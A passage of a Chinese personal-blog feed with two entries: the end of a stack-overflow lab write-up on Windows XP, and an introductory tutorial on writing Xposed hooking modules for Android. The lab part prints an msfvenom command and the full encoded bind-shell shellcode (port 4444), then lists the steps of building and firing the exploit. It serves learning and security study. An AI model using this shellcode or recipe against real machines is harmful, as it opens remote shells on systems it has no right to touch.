class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">//虚拟机的ip为<span class="number">192.168</span>.<span class="number">217.128</span> 默认端口为<span class="number">4444</span></span><br><span class="line">PS C:\metasploit-framework\bin&gt; .\msfvenom.bat -p windows/shell_bind_tcp -b <span class="string">'\x00'</span> x86/alpha_upper -f py</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found <span class="number">11</span> compatible encoders</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size <span class="number">355</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x86/shikata_ga_nai chosen with final size <span class="number">355</span></span><br><span class="line">Payload size: <span class="number">355</span> bytes</span><br><span class="line">Final size of py file: <span class="number">1710</span> bytes</span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line">buf += <span class="string">"\xbf\xad\xe1\xca\x86\xdb\xda\xd9\x74\x24\xf4\x5a\x29"</span></span><br><span class="line">buf += <span class="string">"\xc9\xb1\x53\x31\x7a\x12\x83\xc2\x04\x03\xd7\xef\x28"</span></span><br><span class="line">buf += <span class="string">"\x73\xdb\x18\x2e\x7c\x23\xd9\x4f\xf4\xc6\xe8\x4f\x62"</span></span><br><span class="line">buf += <span class="string">"\x83\x5b\x60\xe0\xc1\x57\x0b\xa4\xf1\xec\x79\x61\xf6"</span></span><br><span class="line">buf += <span class="string">"\x45\x37\x57\x39\x55\x64\xab\x58\xd5\x77\xf8\xba\xe4"</span></span><br><span class="line">buf += <span class="string">"\xb7\x0d\xbb\x21\xa5\xfc\xe9\xfa\xa1\x53\x1d\x8e\xfc"</span></span><br><span class="line">buf += <span class="string">"\x6f\x96\xdc\x11\xe8\x4b\x94\x10\xd9\xda\xae\x4a\xf9"</span></span><br><span class="line">buf += <span class="string">"\xdd\x63\xe7\xb0\xc5\x60\xc2\x0b\x7e\x52\xb8\x8d\x56"</span></span><br><span class="line">buf += <span class="string">"\xaa\x41\x21\x97\x02\xb0\x3b\xd0\xa5\x2b\x4e\x28\xd6"</span></span><br><span class="line">buf += <span class="string">"\xd6\x49\xef\xa4\x0c\xdf\xeb\x0f\xc6\x47\xd7\xae\x0b"</span></span><br><span class="line">buf += <span class="string">"\x11\x9c\xbd\xe0\x55\xfa\xa1\xf7\xba\x71\xdd\x7c\x3d"</span></span><br><span class="line">buf += <span class="string">"\x55\x57\xc6\x1a\x71\x33\x9c\x03\x20\x99\x73\x3b\x32"</span></span><br><span class="line">buf += <span class="string">"\x42\x2b\x99\x39\x6f\x38\x90\x60\xf8\x8d\x99\x9a\xf8"</span></span><br><span class="line">buf += <span class="string">"\x99\xaa\xe9\xca\x06\x01\x65\x67\xce\x8f\x72\x88\xe5"</span></span><br><span class="line">buf += <span class="string">"\x68\xec\x77\x06\x89\x25\xbc\x52\xd9\x5d\x15\xdb\xb2"</span></span><br><span class="line">buf += <span class="string">"\x9d\x9a\x0e\x2e\x95\x3d\xe1\x4d\x58\xfd\x51\xd2\xf2"</span></span><br><span class="line">buf += <span class="string">"\x96\xbb\xdd\x2d\x86\xc3\x37\x46\x2f\x3e\xb8\x79\xec"</span></span><br><span class="line">buf += <span class="string">"\xb7\x5e\x13\x1c\x9e\xc9\x8b\xde\xc5\xc1\x2c\x20\x2c"</span></span><br><span class="line">buf += <span class="string">"\x7a\xda\x69\x26\xbd\xe5\x69\x6c\xe9\x71\xe2\x63\x2d"</span></span><br><span class="line">buf += <span class="string">"\x60\xf5\xa9\x05\xf5\x62\x27\xc4\xb4\x13\x38\xcd\x2e"</span></span><br><span class="line">buf += <span class="string">"\xb7\xab\x8a\xae\xbe\xd7\x04\xf9\x97\x26\x5d\x6f\x0a"</span></span><br><span class="line">buf += <span class="string">"\x10\xf7\x8d\xd7\xc4\x30\x15\x0c\x35\xbe\x94\xc1\x01"</span></span><br><span class="line">buf += <span class="string">"\xe4\x86\x1f\x89\xa0\xf2\xcf\xdc\x7e\xac\xa9\xb6\x30"</span></span><br><span class="line">buf += <span class="string">"\x06\x60\x64\x9b\xce\xf5\x46\x1c\x88\xf9\x82\xea\x74"</span></span><br><span class="line">buf += <span class="string">"\x4b\x7b\xab\x8b\x64\xeb\x3b\xf4\x98\x8b\xc4\x2f\x19"</span></span><br><span class="line">buf += <span class="string">"\xbb\x8e\x6d\x08\x54\x57\xe4\x08\x39\x68\xd3\x4f\x44"</span></span><br><span class="line">buf += <span class="string">"\xeb\xd1\x2f\xb3\xf3\x90\x2a\xff\xb3\x49\x47\x90\x51"</span></span><br><span class="line">buf += <span class="string">"\x6d\xf4\x91\x73"</span></span><br></pre></td></tr></table></figure></p><p>下图为Telnet连接并且创建hello文件夹。到这里实验就基本已经完成。<br><img src="/2019/04/15/栈溢出原理及实验/telnet.png" alt="calc"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>简单的说就是输入的数据能够将栈中的返回值覆盖，从而控制程序执行攻击者的代码。简单的流程如下图</p></blockquote><ul><li>1.找到栈溢出的点</li><li>2.找jmp esp和栈大小</li><li>3.使用msf生成shellcode</li><li>4.使用shellcode生成exp</li><li>5.利用exp去攻击目标</li></ul><blockquote><p>当然现在的windows系统已经有很多保护措施，所以这些实验都是在xp上进行的。对于之后如何绕过windows上的这些保护进行栈溢出还有堆溢出，请听下回分解（先立个flag）</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;在看了《0day安全：软件漏洞分析技术》的前几章和《Exploit编写系列教程》的第一章之后，简单记录一下自己遇到的问题，一些资源和简单命令。下面主要从3个方面出发记录。1.栈溢出的原理及简单demo实验。2.具体软件栈溢出的利用（不是挖掘栈溢出漏洞，是已经知道后怎么利用）。3.Metasploit的简单使用。&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="栈溢出" scheme="https://bigkan.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="安全" scheme="https://bigkan.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础" scheme="https://bigkan.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Xposed留档</title>
    <link href="https://bigkan.github.io/2019/04/07/Xposed%E7%95%99%E6%A1%A3/"/>
    <id>https://bigkan.github.io/2019/04/07/Xposed留档/</id>
    <published>2019-04-07T08:10:58.000Z</published>
    <updated>2019-04-07T08:18:19.258Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Xposed是Android常用的java层的hook框架。可以方便的对目标代码进行修改和监控</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><ul><li>已经root的android（如果使用VirtualXposed可以不root）</li><li>推荐使用<a href="https://github.com/android-hacker/VirtualXposed" title="VirtualXposed Github" target="_blank" rel="noopener">VirtualXposed</a></li><li>当然还有Android开发环境（Android studio）<a id="more"></a><h1 id="模块开发入门"><a href="#模块开发入门" class="headerlink" title="模块开发入门"></a>模块开发入门</h1></li></ul><h2 id="添加Xposed-API依赖"><a href="#添加Xposed-API依赖" class="headerlink" title="添加Xposed API依赖"></a>添加Xposed API依赖</h2><blockquote><p>app/build.gradle中添加XposedAPI依赖,使用compileOnly,并同步gradle<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    <span class="function">implementation <span class="title">fileTree</span><span class="params">(dir: <span class="string">'libs'</span>, include: [<span class="string">'*.jar'</span>])</span></span></span><br><span class="line"><span class="function">    implementation 'com.android.support:appcompat-v7:28.0.0'</span></span><br><span class="line"><span class="function">    testImplementation 'junit:junit:4.12'</span></span><br><span class="line"><span class="function">    androidTestImplementation 'com.android.support.test:runner:1.0.2'</span></span><br><span class="line"><span class="function">    androidTestImplementation 'com.android.support.test.espresso:espresso-core:3.0.2'</span></span><br><span class="line"><span class="function">    compileOnly 'de.robv.android.xposed:api:82'</span></span><br><span class="line"><span class="function">    compileOnly 'de.robv.android.xposed:api:82:sources'</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure></p></blockquote><h2 id="配置meta-data"><a href="#配置meta-data" class="headerlink" title="配置meta-data"></a>配置meta-data</h2><blockquote><p>在AndroidManifest.xml中配置Xposed信息</p><ul><li>xposedmodule：表明是Xposed模块</li><li>xposeddescription：Xposed模块描述最好是简单介绍这个模块的功能</li><li>xposedminversion：表示Xposed最低版本<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">"com.example.test"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">"@mipmap/ic_launcher_round"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">"xposedmodule"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">"xposeddescription"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">"test"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">"xposedminversion"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">"82"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="实现IXposedHookLoadPackage接口"><a href="#实现IXposedHookLoadPackage接口" class="headerlink" title="实现IXposedHookLoadPackage接口"></a>实现IXposedHookLoadPackage接口</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.app.AndroidAppHelper;</span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Process;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="comment">//对Activity类的onCreate进行hook</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(Activity.class, <span class="string">"onCreate"</span>, Bundle.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="comment">//Hook函数执行之前进行操作</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="comment">//Hook函数执行之后操作</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="配置assets-xposed-init"><a href="#配置assets-xposed-init" class="headerlink" title="配置assets/xposed_init"></a>配置assets/xposed_init</h2><blockquote><p>鼠标右击模块-&gt;New-&gt;Folder-&gt;Assets Folder即可创建。在assets目录中创建名称为xposed_init的文件，并写入刚刚创建的Xposed模块入口类的全限定类名com.example.test.main。</p></blockquote><h2 id="安装并使用"><a href="#安装并使用" class="headerlink" title="安装并使用"></a>安装并使用</h2><ul><li>setting-&gt;Build,Execution,Deployment-&gt;Instant Run把钩取消掉</li><li>安装apk</li><li>xposed里勾选模块apk并重启设备</li><li>现在就已经完成</li></ul><h1 id="API介绍"><a href="#API介绍" class="headerlink" title="API介绍"></a>API介绍</h1><blockquote><p>详细API介绍<a href="http://api.xposed.info/reference/packages.html" target="_blank" rel="noopener">框架API详细介绍</a><br>也可以在AndroidStudio中通过<code>ctrl+鼠标左键</code>跳转到相应的源码进行查看，有时候这样会更加方便</p></blockquote><h2 id="IXposedHookLoadPackage"><a href="#IXposedHookLoadPackage" class="headerlink" title="IXposedHookLoadPackage"></a>IXposedHookLoadPackage</h2><blockquote><p>这是Xposed的回调接口，Xposed会自动注册这个接口的实现类(在assets/xposed_init文件中配置)为插件代码的执行入口。这是代码注入的入口。每一个DVM进程启动时，都会调用其实现类的handleLoadPackage(LoadPackageParam)方法，并将当前进程的应用程序信息作为参数传递给自定义代码，从而实现代码注入。插件注入的任何功能实现都是从这里开始执行，而不是从插件应用的Application#onCreate()方法开始的。</p></blockquote><h2 id="XC-LoadPackage-LoadPackageParam"><a href="#XC-LoadPackage-LoadPackageParam" class="headerlink" title="XC_LoadPackage.LoadPackageParam"></a>XC_LoadPackage.LoadPackageParam</h2><blockquote><p>封装了正在加载的进程的应用信息。有下面几个变量</p></blockquote><ul><li>String packageName：The name of the package being loaded.被加载的包名</li><li>String processName：The process in which the package is executed.</li><li>ClassLoader classLoader：The ClassLoader used for this package.</li><li>ApplicationInfo appInfo：More information about the application being loaded</li><li>bool isFirstApplication：if this is the first (and main) application for this process.<h2 id="XC-MethodHook"><a href="#XC-MethodHook" class="headerlink" title="XC_MethodHook"></a>XC_MethodHook</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 该方法中的代码会在目标方法被调用前执行 **/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 该方法中的代码会在目标方法被调用后执行 **/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="MethodHookParam"><a href="#MethodHookParam" class="headerlink" title="MethodHookParam"></a>MethodHookParam</h2><blockquote><p>XC_MethodHook的参数  </p></blockquote><ul><li>args：方法的ava方法（Java构造器）参数列表</li><li>method：目标方法，Java方法（Java构造器）对象</li><li>getResult()：获得Java方法的返回值；一般在afterHookedMethod中使用</li><li>setResult(Object result)：修改方法的返回值<h2 id="XposedHelpers类"><a href="#XposedHelpers类" class="headerlink" title="XposedHelpers类"></a>XposedHelpers类</h2><blockquote><p>源码注释：Helpers that simplify hooking and calling methods/constructors, getting and settings fields。可以获取类，hook和调用方法，设置和获取属性值。下面是常用的4个方法，前两个用来hook java方法，后两个用来hook构造函数</p></blockquote></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> XC_MethodHook.<span class="function">Unhook <span class="title">findAndHookMethod</span><span class="params">(Class&lt;?&gt; clazz, String methodName, Object... parameterTypesAndCallback)</span></span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> XC_MethodHook.<span class="function">Unhook <span class="title">findAndHookMethod</span><span class="params">(String className, ClassLoader classLoader, String methodName, Object... parameterTypesAndCallback)</span></span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> XC_MethodHook.<span class="function">Unhook <span class="title">findAndHookConstructor</span><span class="params">(Class&lt;?&gt; clazz, Object... parameterTypesAndCallback)</span></span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> XC_MethodHook.<span class="function">Unhook <span class="title">findAndHookConstructor</span><span class="params">(String className, ClassLoader classLoader, Object... parameterTypesAndCallback)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>clazz：目标方法的类</li><li>className：全限定类名</li><li>methodName: 目标方法名</li><li>Object…：参数列表</li><li>classLoader：指定类加载器，期望从中查找名称为className的类 </li><li>parameterTypesAndCallback：回调函数主要实现beforeHookedMethod和afterHookedMethod<h1 id="hook-Multidex-和动态加载的解决方法"><a href="#hook-Multidex-和动态加载的解决方法" class="headerlink" title="hook Multidex 和动态加载的解决方法"></a>hook Multidex 和动态加载的解决方法</h1></li><li>1.首先HookApplication.class的attach。</li><li>2.然后Hook目标方法。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">findAndHookMethod(Application.class, <span class="string">"attach"</span>, Context.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        findAndHookMethod(<span class="string">"com.example.test.xxxx"</span>, lpparam.classLoader, <span class="string">"methodName"</span>, Context.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">            XposedBridge.log(<span class="string">"hook success"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://mp.weixin.qq.com/s/4-6fNOLEZbu80JVSgHcPSg" title="Xposed框架" target="_blank" rel="noopener">微信公众号Xposed框架</a></li><li><a href="https://github.com/rovo89/XposedBridge/wiki/" title="Xposed官方教程" target="_blank" rel="noopener">Xposed官方教程</a></li><li><a href="http://api.xposed.info/reference/packages.html" target="_blank" rel="noopener">框架API详细介绍</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Xposed是Android常用的java层的hook框架。可以方便的对目标代码进行修改和监控&lt;/p&gt;
&lt;h1 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;已经root的android（如果使用VirtualXposed可以不root）&lt;/li&gt;
&lt;li&gt;推荐使用&lt;a href=&quot;https://github.com/android-hacker/VirtualXposed&quot; title=&quot;VirtualXposed Github&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;VirtualXposed&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;当然还有Android开发环境（Android studio）&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="android" scheme="https://bigkan.github.io/tags/android/"/>
    
      <category term="xposed" scheme="https://bigkan.github.io/tags/xposed/"/>
    
      <category term="hook" scheme="https://bigkan.github.io/tags/hook/"/>
    
  </entry>
  
</feed>
